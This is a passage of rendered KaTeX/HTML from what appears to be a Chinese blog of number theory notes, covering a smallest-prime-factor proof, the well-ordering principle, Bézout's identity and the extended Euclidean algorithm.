mathvariant="bold">p</mi><mo>&gt;</mo><msup><mi mathvariant="bold">n</mi><mrow><mn mathvariant="bold">1</mn><mi mathvariant="bold">&#x2F;</mi><mn mathvariant="bold">3</mn></mrow></msup></mrow><mspace linebreak="newline"></mspace><mrow><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">1</mn></msub><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">2</mn></msub><mo>&lt;</mo><msup><mi mathvariant="bold">n</mi><mrow><mn mathvariant="bold">2</mn><mi mathvariant="bold">&#x2F;</mi><mn mathvariant="bold">3</mn></mrow></msup></mrow><mspace linebreak="newline"></mspace><mrow><mtext mathvariant="bold">由已知：</mtext><mi mathvariant="bold">p</mi><mtext mathvariant="bold">是</mtext><mi mathvariant="bold">n</mi><mtext mathvariant="bold">的最小因子</mtext></mrow><mspace linebreak="newline"></mspace><mrow><mtext mathvariant="bold">则：</mtext><mi mathvariant="bold">p</mi><mo>&lt;</mo><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">1</mn></msub><mtext mathvariant="bold">且</mtext><mi mathvariant="bold">p</mi><mo>&lt;</mo><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">2</mn></msub></mrow><mspace linebreak="newline"></mspace><mrow><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><msup><mi mathvariant="bold">p</mi><mn mathvariant="bold">2</mn></msup><mo>&lt;</mo><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">1</mn></msub><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">2</mn></msub><mo>&lt;</mo><msup><mi mathvariant="bold">n</mi><mrow><mn mathvariant="bold">2</mn><mi mathvariant="bold">&#x2F;</mi><mn mathvariant="bold">3</mn></mrow></msup></mrow><mspace linebreak="newline"></mspace><mrow><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><mi mathvariant="bold">p</mi><mo>&lt;</mo><msup><mi mathvariant="bold">n</mi><mrow><mn mathvariant="bold">1</mn><mi mathvariant="bold">&#x2F;</mi><mn mathvariant="bold">3</mn></mrow></msup></mrow><mspace linebreak="newline"></mspace><mtext mathvariant="bold">矛盾，原命题得证。</mtext><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">\mathbf{证明：（反证法）}\newline<br>\mathbf{若n&#x2F;p为合数，\exists p_1,p_2\in[2,n&#x2F;p]}\newline<br>\mathbf{使得：p_1 p_2&#x3D;n&#x2F;p}\newline<br>\mathbf{则 p p_1 p_2&#x3D;n}\newline<br>\mathbf{又 p&gt;n^{1&#x2F;3}}\newline<br>\mathbf{p_1 p_2&lt; n^{2&#x2F;3}}\newline<br>\mathbf{由已知：p是n的最小因子}\newline<br>\mathbf{则：p&lt; p_1且p&lt; p_2}\newline<br>\mathbf{\implies p^2 &lt; p_1 p_2 &lt; n ^ {2&#x2F;3}}\newline<br>\mathbf{\implies p&lt; n ^ {1&#x2F;3}}\newline<br>\mathbf{矛盾，原命题得证。}\newline</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6861em;"></span><span class="mord"><span class="mord mathbf cjk_fallback">证明：（反证法）</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbf cjk_fallback">若</span><span class="mord mathbf">n&#x2F;p</span><span class="mord mathbf cjk_fallback">为合数，</span><span class="mord mathbf">∃</span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">[</span><span class="mord mathbf">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathbf">n&#x2F;p</span><span class="mclose">]</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbf cjk_fallback">使得：</span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathbf">n&#x2F;p</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8805em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathbf cjk_fallback">则</span><span class="mord mathbf">p</span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathbf">n</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.0824em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathbf cjk_fallback">又</span><span class="mord mathbf">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathbf">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathbf mtight">1&#x2F;3</span></span></span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.0824em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathbf">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathbf mtight">2&#x2F;3</span></span></span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8805em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathbf cjk_fallback">由已知：</span><span class="mord mathbf">p</span><span class="mord mathbf cjk_fallback">是</span><span class="mord mathbf">n</span><span class="mord mathbf cjk_fallback">的最小因子</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8805em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathbf cjk_fallback">则：</span><span class="mord mathbf">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathbf cjk_fallback">且</span><span class="mord mathbf">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.0824em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathbf">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathbf mtight">2&#x2F;3</span></span></span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.0824em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathbf">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathbf">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathbf mtight">1&#x2F;3</span></span></span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6861em;"></span><span class="mord"><span class="mord mathbf cjk_fallback">矛盾，原命题得证。</span></span></span><span class="mspace newline"></span></span></span></p>        </div>      </div>    </div><h1 id="重要定理及证明-gcd部分"><a href="#重要定理及证明-gcd部分" class="headerlink" title="重要定理及证明(gcd部分)"></a>重要定理及证明(gcd部分)</h1><h2 id="良序原理"><a href="#良序原理" class="headerlink" title="良序原理"></a>良序原理</h2><p><strong>自然数集的每个非空子集都有个最小元素。也称最小数原理。</strong></p><h2 id="定理1-8-贝祖定理"><a href="#定理1-8-贝祖定理" class="headerlink" title="定理1.8(贝祖定理):"></a>定理1.8(贝祖定理):</h2><p>这是GCD 的另一个定义，在高等数学中很有帮助，尤其是环论。<br><img src="/dong.github/images/0916-1.png"></p><h3 id="推论"><a href="#推论" class="headerlink" title="推论:"></a>推论:</h3><ul><li><strong>a 和 b 的任何公约数也会被GCD整除。</strong></li><li><strong>三个或更多数字的 GCD 等于所有数字的质因数的乘积</strong></li><li><strong>计算两个整数的 GCD 的 Euclid 算法足以计算任意多个整数的 GCD。</strong></li></ul><h2 id="定理1-9"><a href="#定理1-9" class="headerlink" title="定理1.9:"></a>定理1.9:</h2><p><img src="/dong.github/images/0915-7.jpg" alt="后续乘法逆元部分的重要铺垫"><br><b><font color="#b30b00">只有两个数互素的时候才有乘法逆元</font></b></p><h2 id="定理1-12："><a href="#定理1-12：" class="headerlink" title="定理1.12："></a>定理1.12：</h2><p><strong>欧几里得定理：</strong><br><img src="/dong.github/images/0915-5.png" alt="理解欧几里得除法的关键点"></p><h2 id="欧几里得除法："><a href="#欧几里得除法：" class="headerlink" title="欧几里得除法："></a>欧几里得除法：</h2><h3 id="基本定义与证明"><a href="#基本定义与证明" class="headerlink" title="基本定义与证明"></a>基本定义与证明</h3><p><img src="/dong.github/images/0915-6.png"><br><strong>于是由欧几里得定理，(a,b) &#x3D; (r0,r1) &#x3D; (r1,r2) &#x3D; …… &#x3D; (rn,0) &#x3D; rn</strong><br><strong>即gcd(a,b)&#x3D;gcd(b,a%b)</strong></p><h2 id="扩展的欧几里得算法"><a href="#扩展的欧几里得算法" class="headerlink" title="扩展的欧几里得算法"></a>扩展的欧几里得算法</h2><blockquote><p>GCD 可以表示为两个原始数字的线性组合，即两个数字之和，每个数字乘以一个整数（例如，21 &#x3D; 5 × 105 + （−2） × 252）。<br><strong>GCD 总是可以用这种方式表达的事实被称为 Bézout 贝祖恒等式</strong>。</p></blockquote><h3 id="定理1-13"><a href="#定理1-13" class="headerlink" title="定理1.13:"></a>定理1.13:</h3><p><img src="/dong.github/images/0916.jpg" alt="扩展欧几里得定理(exgcd算法)"></p><h3 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h3><p><strong>核心：核心思想是反复构造并求解一系列适于裴蜀定理（贝祖定理）的恒等式，进而得到s和t</strong></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-3ccccb70" role="button" aria-expanded="false" aria-controls="collapse-3ccccb70">        <div class="fold-arrow">▶</div>证明      </div>      <div class="fold-collapse collapse" id="collapse-3ccccb70">        <div class="fold-content">          <p>书P12-13：”以q为纽带，尝试计算s和t的数列。通过尝试和整理，得到定理。”<br>但是书上并没有说明s和t的数列是怎么找到的，这里将整个证明过程补全。<br><strong>一切都从贝祖恒等式开始：</strong><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>已知</mtext><mo>:</mo><msub><mi>r</mi><mi>n</mi></msub><mo>&#x3D;</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>&#x3D;</mo><mo stretchy="false">(</mo><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>b</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>那么</mtext><mo>:</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>&#x3D;</mo><mo stretchy="false">(</mo><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mo>−</mo><mi>b</mi><mo stretchy="false">⌊</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo stretchy="false">⌋</mo><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>那么由</mtext><mo>:</mo><msub><mi>s</mi><mi>n</mi></msub><mi>a</mi><mo>+</mo><msub><mi>t</mi><mi>n</mi></msub><mi>b</mi><mo>&#x3D;</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>联系递推式</mtext><mo>:</mo><msub><mi>s</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mi>b</mi><mo>+</mo><msub><mi>t</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>a</mi><mo>−</mo><mi>b</mi><mo stretchy="false">⌊</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo stretchy="false">⌋</mo><mo stretchy="false">)</mo><mo>&#x3D;</mo><mo stretchy="false">(</mo><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mo>−</mo><mi>b</mi><mo stretchy="false">⌊</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo stretchy="false">⌋</mo><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>得到等式</mtext><mo>:</mo><msub><mi>s</mi><mi>n</mi></msub><mi>a</mi><mo>+</mo><msub><mi>t</mi><mi>n</mi></msub><mi>b</mi><mo>&#x3D;</mo><msub><mi>s</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mi>b</mi><mo>+</mo><msub><mi>t</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>a</mi><mo>−</mo><mi>b</mi><mo stretchy="false">⌊</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo stretchy="false">⌋</mo><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><mi>a</mi><mo stretchy="false">(</mo><msub><mi>s</mi><mi>n</mi></msub><mo>−</mo><msub><mi>t</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">)</mo><mo>+</mo><mi>b</mi><mo stretchy="false">(</mo><msub><mi>t</mi><mi>n</mi></msub><mo>−</mo><mo stretchy="false">(</mo><msub><mi>s</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>−</mo><msub><mi>t</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">⌊</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo stretchy="false">⌋</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><msub><mi>s</mi><mi>n</mi></msub><mo>&#x3D;</mo><msub><mi>t</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mspace linebreak="newline"></mspace><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><msub><mi>t</mi><mi>n</mi></msub><mo>&#x3D;</mo><msub><mi>s</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>−</mo><msub><mi>t</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">⌊</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo stretchy="false">⌋</mo><mspace linebreak="newline"></mspace><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>t</mi><mi>n</mi></msub><mo>&#x3D;</mo><msub><mi>t</mi><mrow><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msub><mo>−</mo><msub><mi>q</mi><mi>n</mi></msub><msub><mi>t</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>s</mi><mi>n</mi></msub><mo>&#x3D;</mo><msub><mi>s</mi><mrow><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msub><mo>−</mo><msub><mi>q</mi><mi>n</mi></msub><msub><mi>s</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr></mtable></mrow><mo separator="true">,</mo><mtext> </mtext><mtext> </mtext><mtext> </mtext><msub><mi>q</mi><mi>n</mi></msub><mo>&#x3D;</mo><mo stretchy="false">⌊</mo><msub><mi>r</mi><mrow><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msub><mi mathvariant="normal">&#x2F;</mi><msub><mi>r</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">已知:r_n&#x3D;(a,b)&#x3D;(b,a,mod,b)\newline<br>那么:(a,b)&#x3D;(b,a-b \lfloor \frac{a}{b} \rfloor)\newline<br>那么由:s_na+t_nb&#x3D;(a,b)\newline<br>联系递推式:s_{n-1}b+t_{n-1}(a-b \lfloor \frac{a}{b} \rfloor)&#x3D;(b,a-b \lfloor \frac{a}{b} \rfloor)\newline<br>得到等式:s_na+t_nb&#x3D;s_{n-1}b+t_{n-1}(a-b \lfloor \frac{a}{b} \rfloor)\newline<br>\implies a(s_n-t_{n-1})+b(t_{n}-(s_{n-1}-t_{n-1}\lfloor \frac{a}{b} \rfloor))\newline<br>\implies s_n&#x3D;t_{n-1}\newline<br>\implies t_n&#x3D;s_{n-1}-t_{n-1}\lfloor \frac{a}{b} \rfloor\newline<br>\begin{cases}<br>t_n&#x3D;t_{n-2}-q_nt_{n-1}\newline<br>s_n&#x3D;s_{n-2}-q_ns_{n-1}\newline<br>\end{cases}<br>,,,,q_n&#x3D;\lfloor r_{n-2}&#x2F;r_{n-1} \rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">已知</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">那么</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mord mathnormal">b</span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">那么由</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span 